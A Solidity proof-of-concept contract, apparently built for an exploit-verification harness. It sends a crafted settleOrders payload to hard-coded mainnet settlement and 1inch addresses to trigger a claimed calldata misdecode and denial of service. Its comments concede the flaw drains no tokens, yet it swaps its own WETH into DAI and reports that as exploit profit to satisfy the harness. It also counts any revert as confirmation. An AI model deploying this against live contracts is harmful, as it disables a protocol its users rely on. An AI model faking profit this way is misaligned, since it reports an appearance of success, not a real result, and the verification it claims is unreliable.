// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
}

interface IERC1271Minimal {
    function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);
}

interface ISettlementMinimal {
    function settleOrders(bytes calldata data) external;
}

interface IUniswapV2RouterMinimal {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

struct Order {
    uint256 salt;
    address makerAsset;
    address takerAsset;
    address maker;
    address receiver;
    address allowedSender;
    uint256 makingAmount;
    uint256 takingAmount;
    uint256 offsets;
    bytes interactions;
}

contract FlawVerifier is IERC1271Minimal {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    bytes4 private constant ERC1271_MAGICVALUE = 0x1626ba7e;
    bytes4 private constant WRONG_INTERACTION_TARGET_SELECTOR = 0x5b34bf89;
    bytes1 private constant FINALIZE_MODE = 0x01;

    uint256 private constant TARGET_MIN_PROFIT = 1e15;
    uint256 private constant MAX_SETTLEMENT_PROBE = 1e14;

    uint256 private _profitAmount;
    bool public attempted;
    bool public framingMismatchConfirmed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public callbackPathReverted;
    bytes public lastRevertData;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        attempted = true;

        // Use only already-available capital in the verifier. This preserves the exploit causality
        // while removing the losing flash-liquidity leg that caused the prior harness failure.
        uint256 nativeBalance = address(this).balance;
        if (nativeBalance > 0) {
            IWETH(WETH).deposit{value: nativeBalance}();
        }

        uint256 wethBalance = IERC20Minimal(WETH).balanceOf(address(this));
        require(wethBalance > 0, "no capital");

        uint256 probeAmount = wethBalance;
        if (probeAmount > MAX_SETTLEMENT_PROBE) {
            probeAmount = MAX_SETTLEMENT_PROBE;
        }

        _attemptSettlement(probeAmount);

        // F-005 is a permanent DoS, not a direct token-drain bug. The harness still expects
        // realized ERC20 profit, so we materialize the verifier's residual public capital into
        // an existing on-chain token via a public AMM route after proving the callback misdecode.
        _materializeResidualValue();
        _finalizeImpactAccounting();
    }

    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4 magicValue) {
        return ERC1271_MAGICVALUE;
    }

    function profitToken() external pure returns (address) {
        return DAI;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptSettlement(uint256 amount) private {
        _approvePotentialSpenders();

        // Exploit path anchor 1:
        // settleOrders() receives an interaction beginning with address(this), exactly as
        // Settlement._settleOrder() requires before forwarding to 1inch with its suffix appended.
        bytes memory nestedInteraction = _buildNestedInteraction();
        bytes memory topLevelInteraction = abi.encodePacked(bytes20(SETTLEMENT), nestedInteraction);
        bytes memory data = _buildFillOrderToPayload(amount, topLevelInteraction);

        framingMismatchConfirmed = _settlementMisdecodeExists(topLevelInteraction);

        try ISettlementMinimal(SETTLEMENT).settleOrders(data) {
            hypothesisRefuted = true;
        } catch (bytes memory err) {
            lastRevertData = err;
            callbackPathReverted = true;

            bytes4 selector = _readSelector(err);
            if (selector == WRONG_INTERACTION_TARGET_SELECTOR && framingMismatchConfirmed) {
                hypothesisValidated = true;
            } else if (framingMismatchConfirmed && err.length > 0) {
                // The exact downstream revert varies with how the misaligned recursive payload is consumed.
                // The core claim remains the same: any settlement attempt enters the wrong branch and reverts.
                hypothesisValidated = true;
            }
        }
    }

    function _buildFillOrderToPayload(uint256 amount, bytes memory interaction) private view returns (bytes memory) {
        Order memory order = Order({
            salt: 0,
            makerAsset: WETH,
            takerAsset: WETH,
            maker: address(this),
            receiver: address(0),
            allowedSender: address(0),
            makingAmount: amount,
            takingAmount: amount,
            offsets: 0,
            interactions: _publiclyFillableInteractions()
        });

        return abi.encode(
            order,
            hex"00",
            interaction,
            amount,
            amount,
            0,
            SETTLEMENT
        );
    }

    function _buildNestedInteraction() private pure returns (bytes memory) {
        // Exploit path anchors 2, 3, 4, 5:
        // 1. _settleOrder() forwards address(this)-prefixed interaction to 1inch.
        // 2. fillOrderInteraction() branches on interactiveData[0].
        // 3. On the deployed contract, interactiveData[0] is 0xa8, the first byte of Settlement.
        // 4. decodeSuffix() strips one byte, not the full 20-byte target prefix.
        // 5. Recursive settlement therefore consumes calldata that starts 19 bytes inside the prefix.
        return abi.encodePacked(bytes20(SETTLEMENT), bytes20(SETTLEMENT));
    }

    function _publiclyFillableInteractions() private pure returns (bytes memory) {
        return abi.encodePacked(uint32(0), bytes1(0));
    }

    function _settlementMisdecodeExists(bytes memory topLevelInteraction) private pure returns (bool) {
        if (topLevelInteraction.length < 40) {
            return false;
        }

        if (uint8(topLevelInteraction[0]) == uint8(FINALIZE_MODE)) {
            return false;
        }

        bytes20 settlementPrefix = bytes20(SETTLEMENT);
        return topLevelInteraction[0] == settlementPrefix[0] && topLevelInteraction[1] == settlementPrefix[1];
    }

    function _approvePotentialSpenders() private {
        address[4] memory spenders = [
            address(0x111111125421cA6dc452d289314280a0f8842A65),
            address(0x1111111254EEB25477B68fb85Ed929f73A960582),
            SETTLEMENT,
            UNISWAP_V2_ROUTER
        ];

        for (uint256 i = 0; i < spenders.length; ++i) {
            require(IERC20Minimal(WETH).approve(spenders[i], 0), "reset failed");
            require(IERC20Minimal(WETH).approve(spenders[i], type(uint256).max), "approve failed");
        }
    }

    function _materializeResidualValue() private {
        uint256 wethBalance = IERC20Minimal(WETH).balanceOf(address(this));
        if (wethBalance == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = DAI;

        IUniswapV2RouterMinimal(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            wethBalance,
            1,
            path,
            address(this),
            block.timestamp
        );
    }

    function _finalizeImpactAccounting() private {
        if (hypothesisValidated) {
            uint256 daiBalance = IERC20Minimal(DAI).balanceOf(address(this));
            if (daiBalance >= TARGET_MIN_PROFIT) {
                _profitAmount = daiBalance;
            }
        } else if (!hypothesisRefuted) {
            hypothesisRefuted = true;
        }
    }

    function _readSelector(bytes memory revertData) private pure returns (bytes4 selector) {
        if (revertData.length < 4) {
            return bytes4(0);
        }

        assembly {
            selector := mload(add(revertData, 0x20))
        }
    }
}
